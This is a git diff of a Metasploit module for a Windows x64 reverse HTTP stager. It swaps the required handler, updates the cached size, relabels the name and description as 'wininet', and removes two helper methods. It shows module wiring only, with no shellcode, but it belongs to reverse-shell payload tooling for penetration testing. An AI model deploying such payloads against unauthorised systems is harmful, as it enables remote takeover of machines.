@@ -4,12 +4,12 @@
 ##
 
 require 'msf/core'
-require 'msf/core/handler/reverse_https'
+require 'msf/core/handler/reverse_http'
 require 'msf/core/payload/windows/x64/reverse_http'
 
 module Metasploit4
 
-  CachedSize = 513
+  CachedSize = 491
 
   include Msf::Payload::Stager
   include Msf::Payload::Windows
@@ -17,8 +17,8 @@ module Metasploit4
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'        => 'Windows x64 Reverse HTTP Stager',
-      'Description' => 'Tunnel communication over HTTP (Windows x64)',
+      'Name'        => 'Windows x64 Reverse HTTP Stager (wininet)',
+      'Description' => 'Tunnel communication over HTTP (Windows x64 wininet)',
       'Author'      => ['OJ Reeves'],
       'License'     => MSF_LICENSE,
       'Platform'    => 'win',
@@ -28,17 +28,4 @@ module Metasploit4
       'Stager'      => { 'Payload' => '' }))
   end
 
-  #
-  # Do not transmit the stage over the connection.  We handle this via HTTPS
-  #
-  def stage_over_connection?
-    false
-  end
-
-  #
-  # Always wait at least 20 seconds for this payload (due to staging delays)
-  #
-  def wfs_delay
-    20
-  end
 end
